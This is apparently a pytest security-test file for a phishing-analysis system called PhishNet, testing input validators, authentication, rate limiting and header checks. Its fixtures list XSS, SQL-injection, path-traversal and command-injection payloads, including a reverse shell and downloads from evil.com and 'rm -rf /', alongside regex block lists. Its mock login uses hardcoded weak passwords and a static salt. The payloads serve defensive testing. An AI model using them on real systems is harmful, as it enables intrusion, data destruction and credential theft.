"""
Security testing pipeline for PhishNet system.
Tests XSS validation, authorization, dependency scanning, and security controls.
"""

import pytest
import asyncio
import json
import tempfile
import subprocess
import re
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch
from typing import List, Dict, Any, Optional
import secrets
import hashlib
import base64

# Mock security components for testing
class MockSecurityScanner:
    """Mock security scanner for testing security controls."""
    
    def __init__(self):
        self.scan_results = {}
        self.vulnerability_database = {
            "xss": [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "';alert('xss');//",
                "<svg onload=alert('xss')>"
            ],
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "UNION SELECT * FROM passwords",
                "'; INSERT INTO admin VALUES('hacker','1234'); --"
            ],
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "$(whoami)",
                "`id`",
                "&& curl evil.com"
            ]
        }
    
    def scan_for_vulnerabilities(self, input_data: str, scan_type: str = "all"):
        """Scan input for security vulnerabilities."""
        vulnerabilities = []
        
        if scan_type in ["all", "xss"]:
            for pattern in self.vulnerability_database["xss"]:
                if pattern.lower() in input_data.lower():
                    vulnerabilities.append({
                        "type": "xss",
                        "pattern": pattern,
                        "severity": "high",
                        "description": "Cross-site scripting attempt detected"
                    })
        
        if scan_type in ["all", "sql_injection"]:
            for pattern in self.vulnerability_database["sql_injection"]:
                if pattern.lower() in input_data.lower():
                    vulnerabilities.append({
                        "type": "sql_injection",
                        "pattern": pattern,
                        "severity": "critical",
                        "description": "SQL injection attempt detected"
                    })
        
        if scan_type in ["all", "command_injection"]:
            for pattern in self.vulnerability_database["command_injection"]:
                if pattern.lower() in input_data.lower():
                    vulnerabilities.append({
                        "type": "command_injection",
                        "pattern": pattern,
                        "severity": "critical",
                        "description": "Command injection attempt detected"
                    })
        
        return {
            "input_data": input_data,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "scan_timestamp": datetime.utcnow(),
            "is_safe": len(vulnerabilities) == 0
        }


class MockAuthenticationSystem:
    """Mock authentication system for security testing."""
    
    def __init__(self):
        self.users = {
            "admin@phishnet.com": {
                "password_hash": self._hash_password("admin123"),
                "roles": ["admin", "analyst"],
                "api_key": "admin_api_key_123",
                "mfa_enabled": True,
                "account_locked": False,
                "failed_login_attempts": 0
            },
            "analyst@phishnet.com": {
                "password_hash": self._hash_password("analyst456"),
                "roles": ["analyst"],
                "api_key": "analyst_api_key_456",
                "mfa_enabled": False,
                "account_locked": False,
                "failed_login_attempts": 0
            },
            "user@phishnet.com": {
                "password_hash": self._hash_password("user789"),
                "roles": ["user"],
                "api_key": "user_api_key_789",
                "mfa_enabled": False,
                "account_locked": False,
                "failed_login_attempts": 0
            }
        }
        self.active_sessions = {}
        self.max_failed_attempts = 3
    
    def _hash_password(self, password: str) -> str:
        """Hash password with salt."""
        salt = "phishnet_salt"
        return hashlib.sha256((password + salt).encode()).hexdigest()
    
    async def authenticate_user(self, email: str, password: str):
        """Authenticate user with email and password.""" 
        if email not in self.users:
            return {"success": False, "error": "User not found"}
        
        user = self.users[email]
        
        if user["account_locked"]:
            return {"success": False, "error": "Account locked due to multiple failed attempts"}
        
        if user["password_hash"] != self._hash_password(password):
            user["failed_login_attempts"] += 1
            if user["failed_login_attempts"] >= self.max_failed_attempts:
                user["account_locked"] = True
            return {"success": False, "error": "Invalid credentials"}
        
        # Reset failed attempts on successful login
        user["failed_login_attempts"] = 0
        
        # Create session
        session_token = secrets.token_urlsafe(32)
        self.active_sessions[session_token] = {
            "email": email,
            "roles": user["roles"],
            "created_at": datetime.utcnow(),
            "expires_at": datetime.utcnow() + timedelta(hours=24)
        }
        
        return {
            "success": True,
            "session_token": session_token,
            "user": {
                "email": email,
                "roles": user["roles"],
                "mfa_enabled": user["mfa_enabled"]
            }
        }
    
    async def validate_session(self, session_token: str):
        """Validate session token."""
        if session_token not in self.active_sessions:
            return {"valid": False, "error": "Invalid session token"}
        
        session = self.active_sessions[session_token]
        
        if datetime.utcnow() > session["expires_at"]:
            del self.active_sessions[session_token]
            return {"valid": False, "error": "Session expired"}
        
        return {
            "valid": True,
            "session": session
        }
    
    async def validate_api_key(self, api_key: str):
        """Validate API key."""
        for email, user in self.users.items():
            if user["api_key"] == api_key:
                return {
                    "valid": True,
                    "user": {
                        "email": email,
                        "roles": user["roles"]
                    }
                }
        
        return {"valid": False, "error": "Invalid API key"}
    
    def check_authorization(self, user_roles: List[str], required_role: str):
        """Check if user has required role."""
        return required_role in user_roles


@pytest.fixture
def mock_security_scanner():
    """Provide mock security scanner."""
    return MockSecurityScanner()


@pytest.fixture
def mock_auth_system():
    """Provide mock authentication system."""
    return MockAuthenticationSystem()


@pytest.fixture
def malicious_payloads():
    """Provide various malicious payloads for testing."""
    return {
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ],
        "sql_injection_payloads": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "' UNION SELECT username, password FROM users --",
            "'; INSERT INTO admins VALUES('hacker','password'); --",
            "' AND 1=1 --",
            "' OR 'a'='a",
            "1; DELETE FROM emails; --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
        ],
        "command_injection_payloads": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl http://evil.com",
            "; nc -e /bin/sh evil.com 4444",
            "| wget http://evil.com/malware.sh",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "$(curl http://evil.com/payload)",
            "`cat /etc/shadow`"
        ],
        "path_traversal_payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
        ]
    }


class TestSecurityValidation:
    """Security validation tests."""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xss_prevention(self, mock_security_scanner, malicious_payloads):
        """Test XSS prevention in user inputs."""
        
        class SecuritySanitizer:
            def __init__(self, scanner):
                self.scanner = scanner
                self.blocked_patterns = [
                    r'<script[^>]*>.*?</script>',
                    r'javascript:',
                    r'on\w+\s*=',
                    r'<iframe[^>]*>',
                    r'<object[^>]*>',
                    r'<embed[^>]*>'
                ]
            
            def sanitize_input(self, user_input: str):
                """Sanitize user input to prevent XSS."""
                # Scan for vulnerabilities first
                scan_result = self.scanner.scan_for_vulnerabilities(user_input, "xss")
                
                if not scan_result["is_safe"]:
                    return {
                        "sanitized": False,
                        "original_input": user_input,
                        "blocked_reason": "XSS attempt detected",
                        "vulnerabilities": scan_result["vulnerabilities"]
                    }
                
                # Additional pattern-based filtering
                for pattern in self.blocked_patterns:
                    if re.search(pattern, user_input, re.IGNORECASE):
                        return {
                            "sanitized": False,
                            "original_input": user_input,
                            "blocked_reason": f"Blocked pattern: {pattern}",
                            "vulnerabilities": []
                        }
                
                # HTML encode dangerous characters
                sanitized = (user_input
                           .replace('<', '&lt;')
                           .replace('>', '&gt;')
                           .replace('"', '&quot;')
                           .replace("'", '&#39;')
                           .replace('&', '&amp;'))
                
                return {
                    "sanitized": True,
                    "original_input": user_input,
                    "sanitized_input": sanitized,
                    "vulnerabilities": []
                }
        
        sanitizer = SecuritySanitizer(mock_security_scanner)
        
        # Test each XSS payload
        blocked_count = 0
        for payload in malicious_payloads["xss_payloads"]:
            result = sanitizer.sanitize_input(payload)
            
            # XSS payloads should be blocked or sanitized
            if not result["sanitized"]:
                blocked_count += 1
                assert result["blocked_reason"] is not None
                assert len(result["vulnerabilities"]) > 0 or "Blocked pattern" in result["blocked_reason"]
        
        # Verify that most XSS attempts were blocked
        assert blocked_count >= len(malicious_payloads["xss_payloads"]) * 0.8, "Should block at least 80% of XSS attempts"
        
        # Test legitimate input
        legitimate_input = "This is a normal email subject with no malicious content"
        result = sanitizer.sanitize_input(legitimate_input)
        assert result["sanitized"] is True
        assert "sanitized_input" in result
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, mock_security_scanner, malicious_payloads):
        """Test SQL injection prevention."""
        
        class DatabaseSecurityLayer:
            def __init__(self, scanner):
                self.scanner = scanner
                self.sql_keywords = [
                    'DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION', 'SELECT',
                    'ALTER', 'CREATE', 'TRUNCATE', 'EXEC', 'EXECUTE'
                ]
            
            async def validate_query_input(self, user_input: str):
                """Validate input before using in database queries."""
                # Scan for SQL injection patterns
                scan_result = self.scanner.scan_for_vulnerabilities(user_input, "sql_injection")
                
                if not scan_result["is_safe"]:
                    return {
                        "safe": False,
                        "reason": "SQL injection attempt detected",
                        "vulnerabilities": scan_result["vulnerabilities"]
                    }
                
                # Check for suspicious SQL keywords
                suspicious_patterns = [
                    r"'.*?(?:OR|AND).*?'.*?='.*?'",  # ' OR '1'='1
                    r"'.*?UNION.*?SELECT",           # UNION SELECT
                    r"';.*?(?:DROP|DELETE|INSERT|UPDATE)",  # Command injection
                    r"--",                           # SQL comments
                    r"/\*.*?\*/",                    # SQL block comments
                    r"'.*?;.*?--",                   # Statement termination with comment
                ]
                
                for pattern in suspicious_patterns:
                    if re.search(pattern, user_input, re.IGNORECASE):
                        return {
                            "safe": False,
                            "reason": f"Suspicious SQL pattern detected: {pattern}",
                            "vulnerabilities": []
                        }
                
                # Also check for dangerous SQL keywords in potentially dangerous contexts
                for keyword in self.sql_keywords:
                    # Look for keyword followed by suspicious patterns
                    pattern = rf'\b{keyword}\b.*?(TABLE|FROM|INTO|SET|WHERE)'
                    if re.search(pattern, user_input, re.IGNORECASE):
                        return {
                            "safe": False,
                            "reason": f"Suspicious SQL pattern detected: {keyword}",
                            "vulnerabilities": []
                        }
                
                return {
                    "safe": True,
                    "sanitized_input": user_input.replace("'", "''"),  # Basic SQL escaping
                    "vulnerabilities": []
                }
            
            async def execute_safe_query(self, base_query: str, user_input: str):
                """Execute query with parameterized inputs."""
                validation_result = await self.validate_query_input(user_input)
                
                if not validation_result["safe"]:
                    raise ValueError(f"Unsafe input: {validation_result['reason']}")
                
                # Simulate parameterized query execution
                return {
                    "query_executed": True,
                    "base_query": base_query,
                    "user_input": validation_result["sanitized_input"],
                    "execution_time": 0.001
                }
        
        db_security = DatabaseSecurityLayer(mock_security_scanner)
        
        # Test SQL injection payloads
        blocked_count = 0
        for payload in malicious_payloads["sql_injection_payloads"]:
            validation_result = await db_security.validate_query_input(payload)
            
            if not validation_result["safe"]:
                blocked_count += 1
                assert validation_result["reason"] is not None
        
        # Verify that SQL injection attempts were blocked
        assert blocked_count >= len(malicious_payloads["sql_injection_payloads"]) * 0.8, "Should block at least 80% of SQL injection attempts"
        
        # Test legitimate query input
        legitimate_input = "user@example.com"
        result = await db_security.execute_safe_query(
            "SELECT * FROM users WHERE email = ?",
            legitimate_input
        )
        assert result["query_executed"] is True
        assert result["user_input"] == legitimate_input
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, mock_security_scanner, malicious_payloads):
        """Test command injection prevention."""
        
        class SystemCommandValidator:
            def __init__(self, scanner):
                self.scanner = scanner
                self.dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '{', '}']
                self.allowed_commands = ['ping', 'nslookup', 'dig', 'curl']
            
            async def validate_system_command(self, command: str, args: List[str]):
                """Validate system command before execution.""" 
                full_command = f"{command} {' '.join(args)}"
                
                # Scan for command injection
                scan_result = self.scanner.scan_for_vulnerabilities(full_command, "command_injection")
                
                if not scan_result["is_safe"]:
                    return {
                        "safe": False,
                        "reason": "Command injection attempt detected",
                        "vulnerabilities": scan_result["vulnerabilities"]
                    }
                
                # Check if command is in allowed list
                if command not in self.allowed_commands:
                    return {
                        "safe": False,
                        "reason": f"Command '{command}' not in allowed list",
                        "vulnerabilities": []
                    }
                
                # Check for dangerous characters in arguments
                for arg in args:
                    for char in self.dangerous_chars:
                        if char in arg:
                            return {
                                "safe": False,
                                "reason": f"Dangerous character '{char}' found in argument: {arg}",
                                "vulnerabilities": []
                            }
                
                return {
                    "safe": True,
                    "command": command,
                    "args": args,
                    "full_command": full_command
                }
            
            async def execute_safe_command(self, command: str, args: List[str]):
                """Execute command if validation passes."""
                validation_result = await self.validate_system_command(command, args)
                
                if not validation_result["safe"]:
                    raise ValueError(f"Unsafe command: {validation_result['reason']}")
                
                # Simulate safe command execution
                return {
                    "executed": True,
                    "command": validation_result["command"],
                    "args": validation_result["args"],
                    "output": f"Simulated output for: {validation_result['full_command']}",
                    "exit_code": 0
                }
        
        command_validator = SystemCommandValidator(mock_security_scanner)
        
        # Test command injection payloads
        blocked_count = 0
        for payload in malicious_payloads["command_injection_payloads"]:
            try:
                # Try to execute payload as system command
                validation_result = await command_validator.validate_system_command("ping", [payload])
                if not validation_result["safe"]:
                    blocked_count += 1
            except Exception:
                blocked_count += 1  # Exception also counts as blocked
        
        # Verify command injection prevention
        assert blocked_count >= len(malicious_payloads["command_injection_payloads"]) * 0.9, "Should block at least 90% of command injection attempts"
        
        # Test legitimate command
        result = await command_validator.execute_safe_command("ping", ["google.com"])
        assert result["executed"] is True
        assert result["command"] == "ping"
        assert result["args"] == ["google.com"]
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_authentication_security(self, mock_auth_system):
        """Test authentication system security."""
        
        # Test valid authentication
        auth_result = await mock_auth_system.authenticate_user("admin@phishnet.com", "admin123")
        assert auth_result["success"] is True
        assert "session_token" in auth_result
        assert auth_result["user"]["email"] == "admin@phishnet.com"
        
        # Test invalid password
        auth_result = await mock_auth_system.authenticate_user("admin@phishnet.com", "wrongpassword")
        assert auth_result["success"] is False
        assert "Invalid credentials" in auth_result["error"]
        
        # Test non-existent user
        auth_result = await mock_auth_system.authenticate_user("nonexistent@phishnet.com", "password")
        assert auth_result["success"] is False
        assert "User not found" in auth_result["error"]
        
        # Test account lockout after multiple failed attempts
        for _ in range(3):
            await mock_auth_system.authenticate_user("analyst@phishnet.com", "wrongpassword")
        
        # Account should now be locked
        auth_result = await mock_auth_system.authenticate_user("analyst@phishnet.com", "analyst456")
        assert auth_result["success"] is False
        assert "Account locked" in auth_result["error"]
        
        # Test session validation
        valid_auth = await mock_auth_system.authenticate_user("user@phishnet.com", "user789")
        session_token = valid_auth["session_token"]
        
        session_validation = await mock_auth_system.validate_session(session_token)
        assert session_validation["valid"] is True
        assert session_validation["session"]["email"] == "user@phishnet.com"
        
        # Test invalid session token
        invalid_session = await mock_auth_system.validate_session("invalid_token")
        assert invalid_session["valid"] is False
        assert "Invalid session token" in invalid_session["error"]
        
        # Test API key validation
        api_validation = await mock_auth_system.validate_api_key("admin_api_key_123")
        assert api_validation["valid"] is True
        assert api_validation["user"]["email"] == "admin@phishnet.com"
        
        # Test invalid API key
        invalid_api = await mock_auth_system.validate_api_key("invalid_api_key")
        assert invalid_api["valid"] is False
        assert "Invalid API key" in invalid_api["error"]
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_authorization_controls(self, mock_auth_system):
        """Test role-based authorization controls."""
        
        # Test admin access
        admin_auth = await mock_auth_system.authenticate_user("admin@phishnet.com", "admin123")
        admin_roles = admin_auth["user"]["roles"]
        
        assert mock_auth_system.check_authorization(admin_roles, "admin") is True
        assert mock_auth_system.check_authorization(admin_roles, "analyst") is True
        assert mock_auth_system.check_authorization(admin_roles, "user") is False
        
        # Test analyst access
        analyst_auth = await mock_auth_system.authenticate_user("analyst@phishnet.com", "analyst456")
        # Reset account lock first
        mock_auth_system.users["analyst@phishnet.com"]["account_locked"] = False
        mock_auth_system.users["analyst@phishnet.com"]["failed_login_attempts"] = 0
        analyst_auth = await mock_auth_system.authenticate_user("analyst@phishnet.com", "analyst456")
        analyst_roles = analyst_auth["user"]["roles"]
        
        assert mock_auth_system.check_authorization(analyst_roles, "admin") is False
        assert mock_auth_system.check_authorization(analyst_roles, "analyst") is True
        assert mock_auth_system.check_authorization(analyst_roles, "user") is False
        
        # Test user access
        user_auth = await mock_auth_system.authenticate_user("user@phishnet.com", "user789")
        user_roles = user_auth["user"]["roles"]
        
        assert mock_auth_system.check_authorization(user_roles, "admin") is False
        assert mock_auth_system.check_authorization(user_roles, "analyst") is False
        assert mock_auth_system.check_authorization(user_roles, "user") is True
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, malicious_payloads):
        """Test path traversal attack prevention."""
        
        class FileAccessValidator:
            def __init__(self):
                self.allowed_directories = [
                    "/var/phishnet/uploads",
                    "/var/phishnet/temp",
                    "/var/phishnet/reports"
                ]
                self.dangerous_patterns = [
                    r'\.\./',         # Basic ../ 
                    r'\.\.\\',        # Basic ..\
                    r'%2e%2e%2f',     # URL encoded ../
                    r'%2e%2e%5c',     # URL encoded ..\
                    r'\.\.%2f',       # Mixed encoding
                    r'\.\.%5c',       # Mixed encoding  
                    r'%252e%252e',    # Double URL encoded
                    r'\.{2,}',        # Multiple dots
                    r'\.\.{2,}',      # Multiple dots with path
                    r'\.\..*[/\\]',   # .. followed by path separators
                    r'/etc/',         # Direct system path access
                    r'\\windows\\',   # Windows system paths
                    r'/usr/',         # Unix system paths
                    r'/root/',        # Root directory access
                    r'c:',            # Windows drive access
                    r'system32',      # Windows system directory
                ]
            
            def validate_file_path(self, requested_path: str):
                """Validate file path to prevent directory traversal."""
                # Normalize path
                normalized_path = requested_path.replace('\\', '/').lower()
                
                # Check for path traversal patterns
                for pattern in self.dangerous_patterns:
                    if re.search(pattern, normalized_path, re.IGNORECASE):
                        return {
                            "safe": False,
                            "reason": f"Path traversal pattern detected: {pattern}",
                            "requested_path": requested_path
                        }
                
                # Check if path is within allowed directories
                is_allowed = False
                for allowed_dir in self.allowed_directories:
                    if normalized_path.startswith(allowed_dir.lower()):
                        is_allowed = True
                        break
                
                if not is_allowed:
                    return {
                        "safe": False,
                        "reason": "Path not in allowed directories",
                        "requested_path": requested_path,
                        "allowed_directories": self.allowed_directories
                    }
                
                return {
                    "safe": True,
                    "normalized_path": normalized_path,
                    "requested_path": requested_path
                }
        
        file_validator = FileAccessValidator()
        
        # Test path traversal payloads
        blocked_count = 0
        for payload in malicious_payloads["path_traversal_payloads"]:
            result = file_validator.validate_file_path(f"/var/phishnet/uploads/{payload}")
            if not result["safe"]:
                blocked_count += 1
                assert result["reason"] is not None
        
        # Verify path traversal prevention
        assert blocked_count >= len(malicious_payloads["path_traversal_payloads"]) * 0.8, "Should block at least 80% of path traversal attempts"
        
        # Test legitimate file access
        legitimate_path = "/var/phishnet/uploads/report_2024.pdf"
        result = file_validator.validate_file_path(legitimate_path)
        assert result["safe"] is True
        assert result["normalized_path"] == legitimate_path.lower()
    
    @pytest.mark.security
    @pytest.mark.slow
    @pytest.mark.asyncio
    async def test_dependency_security_scan(self):
        """Test dependency security scanning."""
        
        class DependencyScanner:
            def __init__(self):
                self.known_vulnerabilities = {
                    "requests": {
                        "2.25.1": ["CVE-2021-33503"],
                        "2.24.0": ["CVE-2021-33503", "CVE-2020-26137"]
                    },
                    "pillow": {
                        "8.1.0": ["CVE-2021-25287", "CVE-2021-25288"],
                        "7.2.0": ["CVE-2020-35654", "CVE-2020-35653"]
                    }
                }
            
            async def scan_dependencies(self, requirements_content: str):
                """Scan dependencies for known vulnerabilities."""
                vulnerabilities = []
                dependencies = []
                
                # Parse requirements
                for line in requirements_content.strip().split('\n'):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if '==' in line:
                            package, version = line.split('==')
                            dependencies.append({"package": package.strip(), "version": version.strip()})
                
                # Check for vulnerabilities
                for dep in dependencies:
                    package = dep["package"]
                    version = dep["version"]
                    
                    if package in self.known_vulnerabilities:
                        if version in self.known_vulnerabilities[package]:
                            cves = self.known_vulnerabilities[package][version]
                            vulnerabilities.append({
                                "package": package,
                                "version": version,
                                "cves": cves,
                                "severity": "high" if len(cves) > 1 else "medium"
                            })
                
                return {
                    "total_dependencies": len(dependencies),
                    "vulnerable_dependencies": len(vulnerabilities),
                    "vulnerabilities": vulnerabilities,
                    "scan_timestamp": datetime.utcnow(),
                    "is_secure": len(vulnerabilities) == 0
                }
            
            async def generate_security_report(self, scan_result: Dict):
                """Generate security report from scan results."""
                report = {
                    "scan_summary": {
                        "total_dependencies": scan_result["total_dependencies"],
                        "vulnerable_count": scan_result["vulnerable_dependencies"],
                        "security_status": "SECURE" if scan_result["is_secure"] else "VULNERABLE"
                    },
                    "vulnerability_details": [],
                    "recommendations": []
                }
                
                for vuln in scan_result["vulnerabilities"]:
                    report["vulnerability_details"].append({
                        "package": vuln["package"],
                        "current_version": vuln["version"],
                        "cves": vuln["cves"],
                        "severity": vuln["severity"],
                        "recommendation": f"Update {vuln['package']} to latest secure version"
                    })
                    
                    report["recommendations"].append(f"pip install --upgrade {vuln['package']}")
                
                return report
        
        scanner = DependencyScanner()
        
        # Test with vulnerable dependencies
        vulnerable_requirements = """
        requests==2.25.1
        pillow==8.1.0
        fastapi==0.68.0
        pydantic==1.8.2
        """
        
        scan_result = await scanner.scan_dependencies(vulnerable_requirements)
        
        # Verify vulnerabilities were detected
        assert scan_result["total_dependencies"] == 4
        assert scan_result["vulnerable_dependencies"] == 2
        assert scan_result["is_secure"] is False
        
        # Check specific vulnerabilities
        vuln_packages = [v["package"] for v in scan_result["vulnerabilities"]]
        assert "requests" in vuln_packages
        assert "pillow" in vuln_packages
        
        # Generate security report
        security_report = await scanner.generate_security_report(scan_result)
        assert security_report["scan_summary"]["security_status"] == "VULNERABLE"
        assert len(security_report["vulnerability_details"]) == 2
        assert len(security_report["recommendations"]) == 2
        
        # Test with secure dependencies
        secure_requirements = """
        fastapi==0.100.0
        pydantic==2.0.0
        """
        
        secure_scan = await scanner.scan_dependencies(secure_requirements)
        assert secure_scan["is_secure"] is True
        assert secure_scan["vulnerable_dependencies"] == 0
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_rate_limiting_security(self):
        """Test rate limiting for security."""
        
        class RateLimiter:
            def __init__(self):
                self.request_counts = {}
                self.rate_limits = {
                    "login": {"max_requests": 5, "time_window": 300},  # 5 attempts per 5 minutes
                    "api": {"max_requests": 100, "time_window": 60},   # 100 requests per minute
                    "password_reset": {"max_requests": 3, "time_window": 600}  # 3 resets per 10 minutes
                }
            
            async def check_rate_limit(self, client_id: str, endpoint: str):
                """Check if client has exceeded rate limit."""
                if endpoint not in self.rate_limits:
                    return {"allowed": True, "reason": "No rate limit configured"}
                
                rate_config = self.rate_limits[endpoint]
                current_time = datetime.utcnow().timestamp()
                
                # Initialize client tracking
                if client_id not in self.request_counts:
                    self.request_counts[client_id] = {}
                
                if endpoint not in self.request_counts[client_id]:
                    self.request_counts[client_id][endpoint] = []
                
                # Clean old requests outside time window
                client_requests = self.request_counts[client_id][endpoint]
                cutoff_time = current_time - rate_config["time_window"]
                client_requests[:] = [req_time for req_time in client_requests if req_time > cutoff_time]
                
                # Check if limit exceeded
                if len(client_requests) >= rate_config["max_requests"]:
                    return {
                        "allowed": False,
                        "reason": "Rate limit exceeded",
                        "limit": rate_config["max_requests"],
                        "time_window": rate_config["time_window"],
                        "retry_after": rate_config["time_window"]
                    }
                
                # Add current request
                client_requests.append(current_time)
                
                return {
                    "allowed": True,
                    "requests_remaining": rate_config["max_requests"] - len(client_requests),
                    "reset_time": cutoff_time + rate_config["time_window"]
                }
        
        rate_limiter = RateLimiter()
        
        # Test login rate limiting
        client_ip = "192.168.1.100"
        
        # First 5 requests should be allowed
        for i in range(5):
            result = await rate_limiter.check_rate_limit(client_ip, "login")
            assert result["allowed"] is True
            assert result["requests_remaining"] == 4 - i
        
        # 6th request should be blocked
        result = await rate_limiter.check_rate_limit(client_ip, "login")
        assert result["allowed"] is False
        assert "Rate limit exceeded" in result["reason"]
        assert result["limit"] == 5
        
        # Test API rate limiting with different client
        api_client = "api_key_123"
        
        # First 100 requests should be allowed
        for i in range(100):
            result = await rate_limiter.check_rate_limit(api_client, "api")
            assert result["allowed"] is True
        
        # 101st request should be blocked
        result = await rate_limiter.check_rate_limit(api_client, "api")
        assert result["allowed"] is False
        assert result["limit"] == 100
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_security_headers_validation(self):
        """Test security headers implementation."""
        
        class SecurityHeadersValidator:
            def __init__(self):
                self.required_headers = {
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "DENY",
                    "X-XSS-Protection": "1; mode=block",
                    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
                    "Content-Security-Policy": "default-src 'self'",
                    "Referrer-Policy": "strict-origin-when-cross-origin",
                    "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
                }
            
            def validate_response_headers(self, response_headers: Dict[str, str]):
                """Validate security headers in HTTP response."""
                missing_headers = []
                incorrect_headers = []
                
                for header, expected_value in self.required_headers.items():
                    if header not in response_headers:
                        missing_headers.append(header)
                    elif response_headers[header] != expected_value:
                        incorrect_headers.append({
                            "header": header,
                            "expected": expected_value,
                            "actual": response_headers[header]
                        })
                
                security_score = (
                    (len(self.required_headers) - len(missing_headers) - len(incorrect_headers))
                    / len(self.required_headers) * 100
                )
                
                return {
                    "security_score": security_score,
                    "missing_headers": missing_headers,
                    "incorrect_headers": incorrect_headers,
                    "is_secure": len(missing_headers) == 0 and len(incorrect_headers) == 0,
                    "total_headers_checked": len(self.required_headers)
                }
        
        validator = SecurityHeadersValidator()
        
        # Test with all correct security headers
        secure_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
            "Content-Type": "application/json"
        }
        
        result = validator.validate_response_headers(secure_headers)
        assert result["is_secure"] is True
        assert result["security_score"] == 100.0
        assert len(result["missing_headers"]) == 0
        assert len(result["incorrect_headers"]) == 0
        
        # Test with missing security headers
        insecure_headers = {
            "Content-Type": "application/json",
            "X-Content-Type-Options": "nosniff"
        }
        
        result = validator.validate_response_headers(insecure_headers)
        assert result["is_secure"] is False
        assert result["security_score"] < 50.0
        assert len(result["missing_headers"]) > 0
        
        # Test with incorrect security headers
        incorrect_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "SAMEORIGIN",  # Should be DENY
            "X-XSS-Protection": "0",           # Should be 1; mode=block
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
        }
        
        result = validator.validate_response_headers(incorrect_headers)
        assert result["is_secure"] is False
        assert len(result["incorrect_headers"]) == 2
        
        incorrect_x_frame = next(h for h in result["incorrect_headers"] if h["header"] == "X-Frame-Options")
        assert incorrect_x_frame["expected"] == "DENY"
        assert incorrect_x_frame["actual"] == "SAMEORIGIN"
